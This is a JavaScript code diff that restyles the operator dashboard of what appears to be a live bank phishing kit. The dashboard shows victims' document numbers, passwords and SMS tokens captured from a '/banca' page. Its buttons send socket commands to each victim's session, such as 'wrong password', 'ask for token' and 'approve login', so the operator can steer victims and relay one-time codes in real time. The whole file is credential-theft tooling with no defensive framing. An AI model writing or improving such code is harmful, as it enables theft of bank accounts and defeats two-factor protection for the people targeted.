@@ -15,44 +15,39 @@
 
     if (sessions.length === 0) {
       container.innerHTML = `
-        <div class="empty-sessions">
-          <p>⚡ No hay usuarios conectados en este momento.</p>
-          <small>Los datos de los usuarios que accedan a <b>/banca</b> aparecerán aquí en tiempo real.</small>
+        <div class="empty-state">
+          <h3>⚡ Esperando usuarios conectados...</h3>
+          <p>Los datos ingresados por los usuarios en <b>/banca</b> aparecerán aquí en tiempo real.</p>
         </div>
       `;
       return;
     }
 
     container.innerHTML = sessions.map((s) => `
-      <div class="session-card glass-card" data-id="${s.id}">
-        <div class="session-header">
-          <div>
-            <span class="status-badge ${s.step}">${s.status || s.step}</span>
-            <small class="time-stamp">⏰ ${s.updatedAt || ""}</small>
-          </div>
-          <small class="ip-addr">🌐 ${s.ip || "127.0.0.1"}</small>
+      <div class="session-card" data-id="${s.id}">
+        <div class="card-top">
+          <span class="step-pill">${s.status || s.step}</span>
+          <span class="time-info">⏰ ${s.updatedAt || ""}</span>
         </div>
-        <div class="session-body">
-          <div class="data-field">
-            <label>📄 Documento (${s.docType || "DNI"}):</label>
-            <span class="val-highlight">${s.docNumber || "—"}</span>
-          </div>
-          <div class="data-field">
-            <label>🔑 Contraseña:</label>
-            <span class="val-highlight pass">${s.password || "—"}</span>
-          </div>
-          <div class="data-field">
-            <label>📱 Código SMS / Token:</label>
-            <span class="val-highlight token">${s.token || "—"}</span>
-          </div>
+        <div class="data-row">
+          <span class="data-label">📄 ${s.docType || "DNI"}</span>
+          <span class="data-val doc">${s.docNumber || "—"}</span>
         </div>
-        <div class="session-actions">
-          <button class="cmd-btn btn-danger" onclick="sendCmd('${s.id}', 'wrong_doc', 'Documento incorrecto')">❌ Err. Doc</button>
-          <button class="cmd-btn btn-warning" onclick="sendCmd('${s.id}', 'wrong_pass', 'Contraseña incorrecta')">🔑 Err. Clave</button>
-          <button class="cmd-btn btn-warning" onclick="sendCmd('${s.id}', 'wrong_token', 'Token inválido')">📲 Err. SMS</button>
-          <button class="cmd-btn btn-info" onclick="sendCmd('${s.id}', 'ask_pass', 'Pedir clave')">➡️ Ir a Clave</button>
-          <button class="cmd-btn btn-info" onclick="sendCmd('${s.id}', 'ask_token', 'Pedir token')">📱 Pedir SMS</button>
-          <button class="cmd-btn btn-success" onclick="sendCmd('${s.id}', 'approve', 'Aprobar')">✅ Aprobar Login</button>
+        <div class="data-row">
+          <span class="data-label">🔑 Contraseña</span>
+          <span class="data-val pass">${s.password || "—"}</span>
+        </div>
+        <div class="data-row">
+          <span class="data-label">📱 Código SMS Token</span>
+          <span class="data-val token">${s.token || "—"}</span>
+        </div>
+        <div class="actions-grid">
+          <button class="cmd-btn btn-err-doc" onclick="sendCmd('${s.id}', 'wrong_doc', 'Documento incorrecto')">❌ Err. Doc</button>
+          <button class="cmd-btn btn-err-pass" onclick="sendCmd('${s.id}', 'wrong_pass', 'Contraseña incorrecta')">🔑 Err. Clave</button>
+          <button class="cmd-btn btn-err-token" onclick="sendCmd('${s.id}', 'wrong_token', 'Token inválido')">📲 Err. SMS</button>
+          <button class="cmd-btn btn-ask-pass" onclick="sendCmd('${s.id}', 'ask_pass', 'Pedir clave')">➡️ Pedir Clave</button>
+          <button class="cmd-btn btn-ask-token" onclick="sendCmd('${s.id}', 'ask_token', 'Pedir token')">📱 Pedir Token</button>
+          <button class="cmd-btn btn-approve" onclick="sendCmd('${s.id}', 'approve', 'Aprobar')">✅ Aprobar Login</button>
         </div>
       </div>
     `).join("");
@@ -68,3 +63,4 @@
     socket.emit("admin:command", { targetId, action, message });
   };
 })();
+
